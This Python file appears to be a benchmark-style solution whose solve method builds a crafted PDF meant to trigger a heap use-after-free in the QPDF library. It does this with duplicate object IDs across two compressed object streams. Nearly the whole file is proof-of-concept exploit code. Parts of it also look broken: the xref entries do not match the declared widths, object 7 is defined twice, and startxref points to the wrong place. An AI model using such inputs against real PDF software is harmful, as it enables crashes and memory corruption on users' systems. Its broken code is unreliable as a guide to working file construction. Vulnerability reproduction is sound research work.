import os
import struct
import zlib
import tempfile
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PDF that triggers the heap use-after-free in QPDF
        # This generates a PDF with multiple object streams and duplicate object IDs
        
        pdf_data = []
        
        # PDF header
        pdf_data.append(b"%PDF-1.4\n")
        
        # Object 1: Catalog
        catalog_obj = b"1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj\n"
        pdf_data.append(catalog_obj)
        
        # Object 2: Pages tree
        pages_obj = b"2 0 obj\n<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>\nendobj\n"
        pdf_data.append(pages_obj)
        
        # Object 3: Page
        page_obj = b"3 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n/Resources <<\n/Font <<\n/F1 5 0 R\n>>\n>>\n>>\nendobj\n"
        pdf_data.append(page_obj)
        
        # Object 4: Content stream
        content = b"BT\n/F1 12 Tf\n72 720 Td\n(Hello World) Tj\nET"
        content_stream = b"4 0 obj\n<<\n/Length %d\n>>\nstream\n%s\nendstream\nendobj\n" % (len(content), content)
        pdf_data.append(content_stream)
        
        # Object 5: Font
        font_obj = b"5 0 obj\n<<\n/Type /Font\n/Subtype /Type1\n/BaseFont /Helvetica\n/Encoding /WinAnsiEncoding\n>>\nendobj\n"
        pdf_data.append(font_obj)
        
        # Create first object stream (ObjStm)
        # This will contain multiple objects
        obj_stream_1_objs = []
        obj_stream_1_refs = []
        
        # Add some objects to the first object stream
        for i in range(10):
            obj_num = 6 + i
            obj_data = b"<<\n/Type /Annot\n/Subtype /Text\n/Rect [0 0 100 100]\n/Contents (Annotation %d)\n>>" % i
            obj_stream_1_objs.append(obj_data)
            obj_stream_1_refs.append(b"%d 0" % obj_num)
        
        # Create the object stream data
        obj_stream_1_data = b""
        offset = 0
        offsets = []
        
        for i, obj_data in enumerate(obj_stream_1_objs):
            offsets.append(offset)
            obj_stream_1_data += obj_data + b"\n"
            offset += len(obj_data) + 1
        
        # Create the index at the beginning of the stream
        index = b""
        for i in range(len(obj_stream_1_refs)):
            index += b"%s %d " % (obj_stream_1_refs[i], offsets[i])
        
        # Compress the object stream
        full_stream = index + b"\n" + obj_stream_1_data
        compressed = zlib.compress(full_stream)
        
        # Object 6: First object stream
        objstm_1 = b"6 0 obj\n<<\n/Type /ObjStm\n/N %d\n/First %d\n/Length %d\n/Filter /FlateDecode\n>>\nstream\n%s\nendstream\nendobj\n" % (
            len(obj_stream_1_refs), len(index) + 1, len(compressed), compressed
        )
        pdf_data.append(objstm_1)
        
        # Create a second object stream with duplicate object IDs
        # This is key to triggering the bug
        obj_stream_2_objs = []
        obj_stream_2_refs = []
        
        # Reuse some object IDs from the first stream
        for i in range(5):
            obj_num = 7 + i  # Overlap with first stream
            obj_data = b"<<\n/Type /Annot\n/Subtype /Square\n/Rect [100 100 200 200]\n/Contents (Duplicate Annotation %d)\n>>" % i
            obj_stream_2_objs.append(obj_data)
            obj_stream_2_refs.append(b"%d 0" % obj_num)
        
        # Create the second object stream data
        obj_stream_2_data = b""
        offset = 0
        offsets = []
        
        for i, obj_data in enumerate(obj_stream_2_objs):
            offsets.append(offset)
            obj_stream_2_data += obj_data + b"\n"
            offset += len(obj_data) + 1
        
        # Create the index for second stream
        index2 = b""
        for i in range(len(obj_stream_2_refs)):
            index2 += b"%s %d " % (obj_stream_2_refs[i], offsets[i])
        
        # Compress the second object stream
        full_stream2 = index2 + b"\n" + obj_stream_2_data
        compressed2 = zlib.compress(full_stream2)
        
        # Object 7: Second object stream with overlapping object IDs
        objstm_2 = b"7 0 obj\n<<\n/Type /ObjStm\n/N %d\n/First %d\n/Length %d\n/Filter /FlateDecode\n>>\nstream\n%s\nendstream\nendobj\n" % (
            len(obj_stream_2_refs), len(index2) + 1, len(compressed2), compressed2
        )
        pdf_data.append(objstm_2)
        
        # Add more objects to increase size and complexity
        for i in range(20):
            obj_num = 20 + i
            obj = b"%d 0 obj\n<<\n/Type /XObject\n/Subtype /Form\n/BBox [0 0 100 100]\n/Length 0\n>>\nstream\n\nendstream\nendobj\n" % obj_num
            pdf_data.append(obj)
        
        # Create a cross-reference stream that references both object streams
        # This helps trigger the preserveObjectStreams code path
        xref_data = []
        
        # Add entries for all objects
        for i in range(50):
            xref_data.append(struct.pack('>I', 1))  # type 1 = in-use
        
        xref_stream = b"".join(xref_data)
        compressed_xref = zlib.compress(xref_stream)
        
        # XRef stream object
        xref_obj = b"50 0 obj\n<<\n/Type /XRef\n/Size 51\n/W [1 2 0]\n/Index [0 51]\n/Length %d\n/Filter /FlateDecode\n>>\nstream\n%s\nendstream\nendobj\n" % (
            len(compressed_xref), compressed_xref
        )
        pdf_data.append(xref_obj)
        
        # Trailer
        trailer = b"trailer\n<<\n/Size 51\n/Root 1 0 R\n>>\nstartxref\n"
        pdf_data.append(trailer)
        
        # Calculate startxref position
        startxref_pos = sum(len(chunk) for chunk in pdf_data)
        pdf_data.append(b"%d\n" % startxref_pos)
        pdf_data.append(b"%%EOF")
        
        # Combine all parts
        final_pdf = b"".join(pdf_data)
        
        return final_pdf